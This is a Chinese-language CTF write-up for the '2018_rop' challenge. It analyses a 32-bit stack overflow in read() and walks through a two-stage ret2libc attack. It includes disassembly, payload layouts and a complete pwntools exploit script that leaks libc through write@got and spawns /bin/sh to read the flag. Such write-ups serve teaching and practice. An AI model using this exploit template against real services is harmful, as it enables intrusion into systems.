# Speedrun：铁人三项（第五赛区）2018_rop

> 题型：ret2libc / 32 位 `read` 栈溢出  
> 目标：`write(1, write@got, 4)` leak libc，回 `main`，二阶段 `system("/bin/sh")`  
> 关键：偏移 **140**；`write@plt=0x80483A0`；`write@got=0x804A010`；`main=0x80484C6`

---

## 0. 一句话结论

```text
vulnerable_function:
  char buf[0x88] @ ebp-0x88
  read(0, buf, 0x100)

  32 位 saved EIP @ ebp+4
  offset = 0x88 + 4 = 140

Stage 1:
  write(1, write@got, 4) -> main

Stage 2:
  system("/bin/sh")

  [140 A][write@plt][main][1][write@got][4]
  [140 A][system][dummy][binsh]
```

和 `jarvisoj_level4` 是同一套模板，只有 PLT/GOT/main 地址不同。  
`be_nice_to_people()` 里的 `setresgid` 是干扰项，不影响栈溢出。

---

## 1. 30 秒定性质

```bash
cd '/home/yfhd5/Pwn_Writeups/ret2libc'

file '铁人三项（第五赛区）2018_rop'
checksec --file='铁人三项（第五赛区）2018_rop'
nm -n '铁人三项（第五赛区）2018_rop' | grep -E ' (main|vulnerable_function|be_nice_to_people)$'
objdump -d -M intel '铁人三项（第五赛区）2018_rop' | sed -n '/<vulnerable_function>:/,/^$/p'
objdump -d -M intel '铁人三项（第五赛区）2018_rop' | sed -n '/<main>:/,/^$/p'
objdump -R '铁人三项（第五赛区）2018_rop' | grep -E 'write|read'
```

关键输出：

```text
ELF 32-bit LSB executable, Intel i386, dynamically linked, not stripped
Partial RELRO
No canary found
NX enabled
No PIE (0x8048000)
Not stripped

08048474 <vulnerable_function>
0804849d <be_nice_to_people>
080484c6 <main>

0804a010 R_386_JUMP_SLOT   write@GLIBC_2.0
```

读法：

| 观察 | 结论 |
| --- | --- |
| 32 位 i386 | cdecl，参数在栈上 |
| `read(0, buf, 0x100)`，buf 0x88 | 覆盖 saved EIP，offset 140 |
| No canary | 不需要 canary leak |
| No PIE | 地址固定 |
| Partial RELRO | GOT 可读，能 leak |
| 没有 `system@plt` | 必须 ret2libc |
| `be_nice_to_people` | `setresgid` 降权/权限整理，烟雾弹 |

### 1.1 `vulnerable_function`

```asm
08048474 <vulnerable_function>:
 8048474: push   ebp
 8048475: mov    ebp,esp
 8048477: sub    esp,0x98
 804847d: mov    DWORD PTR [esp+0x8],0x100
 8048485: lea    eax,[ebp-0x88]
 804848b: mov    DWORD PTR [esp+0x4],eax
 804848f: mov    DWORD PTR [esp],0x0
 8048496: call   8048360 <read@plt>
 804849b: leave
 804849c: ret
```

等价 C：

```c
void vulnerable_function(void) {
    char buf[0x88];
    read(0, buf, 0x100);
}
```

栈布局：

```text
ebp-0x88 .. ebp-0x01 : buf[0x88]
ebp+0x00 .. ebp+0x03 : saved ebp
ebp+0x04 .. ebp+0x07 : saved EIP
```

```text
offset = 0x88 + 4 = 0x8c = 140
```

注意 `sub esp,0x98` 只是编译器多留了局部空间，buffer 起点仍是 `ebp-0x88`，不要按 0x98 算偏移。

### 1.2 `main`

```asm
080484c6 <main>:
 80484c6: push   ebp
 80484c7: mov    ebp,esp
 80484c9: and    esp,0xfffffff0
 80484cc: sub    esp,0x10
 80484cf: call   804849d <be_nice_to_people>
 80484d4: call   8048474 <vulnerable_function>
 80484d9: mov    DWORD PTR [esp+0x8],0xd
 80484e1: mov    DWORD PTR [esp+0x4],0x80485d0    ; "Hello, World!\n"
 80484e9: mov    DWORD PTR [esp],0x1
 80484f0: call   80483a0 <write@plt>
 80484f5: leave
 80484f6: ret
```

`be_nice_to_people`：

```asm
0804849d <be_nice_to_people>:
 80484a3: call   8048370 <getegid@plt>
 80484bf: call   80483b0 <setresgid@plt>
```

它只是把进程的 gid 设成当前 egid；与利用无关。

---

## 2. 地址

| 符号 | 地址 |
| --- | --- |
| `write@plt` | `0x80483a0` |
| `write@got` | `0x804a010` |
| `main` | `0x80484c6` |
| `vulnerable_function` | `0x8048474` |

Stage 1：

```text
write@plt
main
1
write@got
4
```

Stage 2：

```text
system
0xDEADBEEF
binsh
```

32 位 cdecl 下 `write@plt` 返回后跳到 `main`，`main` 再次调用 `vulnerable_function`，于是能发第二阶段。

---

## 3. Payload 布局

```python
OFFSET = 0x88 + 4

stage1 = flat(
    b"A" * OFFSET,
    WRITE_PLT, MAIN, 1, WRITE_GOT, 4,
)

stage2 = flat(
    b"A" * OFFSET,
    system, 0xDEADBEEF, binsh,
)
```

```text
Stage 1:
[ 140 'A' ][ write@plt ][ main ][ 1 ][ write@got ][ 4 ]

Stage 2:
[ 140 'A' ][ system ][ 0xDEADBEEF ][ binsh ]
```

libc base：

```python
leak = u32(p.recvn(4))
base = leak - libc.symbols["write"]
assert base & 0xFFF == 0
```

`write` 输出原始 4 字节，不会像 `puts` 一样在 `\x00` 处截断。

---

## 4. 完整 exp

```python
from pwn import *
import os
import re
import ssl
import time

context.arch = "i386"
context.log_level = "info"

BIN = "./铁人三项（第五赛区）2018_rop"
HOST = os.getenv("HOST", "")
PORT = int(os.getenv("PORT", "9999"))
LIBC_PATH = os.getenv("LIBC", "")

WRITE_PLT = 0x80483A0
WRITE_GOT = 0x804A010
MAIN = 0x80484C6

# vulnerable_function: char buf[0x88] @ ebp-0x88; saved EIP @ ebp+4
OFFSET = 0x88 + 4


def start():
    if args.LOCAL:
        ld = os.getenv("I386_LD")
        libpath = os.getenv("I386_LIBPATH")
        if ld:
            return process([ld, "--library-path", libpath, BIN])
        return process(BIN)

    if not HOST:
        raise SystemExit(
            "[-] set HOST/PORT, or run: python 11_2018_rop_exp.py LOCAL"
        )

    if os.getenv("SSL", "0") == "1":
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return remote(HOST, PORT, ssl=True, ssl_context=ctx, sni=HOST)

    return remote(HOST, PORT)


def resolve_libc():
    path = LIBC_PATH
    if not path and args.LOCAL:
        libpath = os.getenv("I386_LIBPATH", "")
        if libpath:
            path = os.path.join(libpath, "libc.so.6")

    if not path:
        raise SystemExit(
            "[-] set LIBC=/path/to/libc.so.6, or use I386_LIBPATH for LOCAL"
        )

    return ELF(path, checksec=False)


def exploit():
    p = start()
    libc = resolve_libc()

    # Stage 1: write(1, write@got, 4), then re-enter main.
    stage1 = flat(
        b"A" * OFFSET,
        WRITE_PLT, MAIN, 1, WRITE_GOT, 4,
    )
    p.send(stage1)

    leak = u32(p.recvn(4))
    libc_base = leak - libc.symbols["write"]
    if libc_base & 0xFFF:
        raise SystemExit(
            f"[-] libc base {libc_base:#x} is not page aligned; "
            "LIBC does not match the target"
        )
    system = libc_base + libc.symbols["system"]
    binsh = libc_base + next(libc.search(b"/bin/sh\x00"))
    log.success(
        f"write = {leak:#x}, libc = {libc_base:#x}, system = {system:#x}"
    )

    # Stage 2: system("/bin/sh").
    stage2 = flat(
        b"A" * OFFSET,
        system, 0xDEADBEEF, binsh,
    )
    p.send(stage2)

    time.sleep(0.2)
    p.sendline(
        b"echo __PWNED__; cat flag* 2>/dev/null; cat /flag* 2>/dev/null; exit"
    )

    out = p.recvall(timeout=10).decode("utf-8", errors="ignore")
    print(out)

    flags = re.findall(r"(?:flag|CTF2|DASCTF)\{[^}]+\}", out, re.I)
    if flags:
        print(f"[+] GOT THE FLAG: {flags[0]}")
    else:
        print("[-] flag not found, raw output above")


if __name__ == "__main__":
    exploit()
```

本地验证：

```bash
cd '/home/yfhd5/Pwn_Writeups/ret2libc'
I386_LD=/tmp/libc32/root/usr/lib/i386-linux-gnu/ld-linux.so.2 \
I386_LIBPATH=/tmp/libc32/root/usr/lib/i386-linux-gnu \
../.venv/bin/python 11_2018_rop_exp.py LOCAL
```

本机 `glibc 2.43` 下预期：

```text
write = 0xf7e1f560
libc  = 0xf7d00000
system = 0xf7d53cc0
__PWNED__
```

远程：

```bash
HOST=... PORT=... LIBC=./libc.so.6 python 11_2018_rop_exp.py
# TLS 平台额外设置 SSL=1
```

---

## 5. 交互坑

1. **offset 是 `0x88 + 4`，不是 `0x98 + 4`**  
   `sub esp,0x98` 是编译器栈帧大小，buffer 只有 0x88；saved ebp 在 `ebp`，saved EIP 在 `ebp+4`。

2. **`write` 的 cdecl 参数顺序**  
   `write(fd=1, buf=write@got, count=4)`；栈上依次 `1, write@got, 4`，不要写反。

3. **Stage 1 末尾返回 `main`**  
   只有 `main` 会再次调用 `vulnerable_function`；返回 `vulnerable_function` 也可以，但 `main` 更直观。

4. **`write` leak 用 `recvn(4)`**  
   固定 4 字节；不要用 `recvline`，避免地址中的 `0x0a` 污染。

5. **libc 必须匹配**  
   本地用 `I386_LIBPATH` 下的 libc；远程用题目附件。  
   `base & 0xFFF != 0` 立即停。

6. **`be_nice_to_people` 不需要绕过**  
   `setresgid` 在 `vulnerable_function` 之前执行，但不会阻止 ROP。

7. **`system` 的 dummy 返回地址**  
   32 位参数在栈上，`system` 后的第一个 4 字节是它返回后要跳的地址；放 `0xDEADBEEF` 即可。

8. **不要用 `sendline` 发 ROP**  
   `read` 按 0x100 读，payload 后面多一个 `\n` 会被留在流中；用 `send`。

---

## 6. 2 分钟速通时间线

| 时间 | 动作 |
| --- | --- |
| 0:00–0:20 | `file` + `checksec`：32 位、No PIE、No canary、Partial RELRO |
| 0:20–0:40 | `objdump vulnerable_function`：`buf=ebp-0x88`，offset 140 |
| 0:40–1:00 | 找 `write@plt=0x80483a0`、`write@got=0x804a010`、`main=0x80484c6` |
| 1:00–1:20 | Stage 1：`write(1, write@got, 4)` → `main` |
| 1:20–1:45 | 算 libc base，Stage 2：`system("/bin/sh")` |
| 1:45–2:05 | 本地 i386 验证 `__PWNED__`，再打远程 |

---

## 7. 题型识别卡

```text
32 位 + No canary + No PIE + Partial RELRO
+ read(0, ebp-0x88, 0x100)
+ 没有 system@plt，有 write@plt / write@got
= ret2libc：write leak -> main -> system("/bin/sh")
```

一句话：**和 `jarvisoj_level4` 同一套模板，先 `write(1, write@got, 4)`，回 `main`，再 `system` + dummy + `/bin/sh`。**

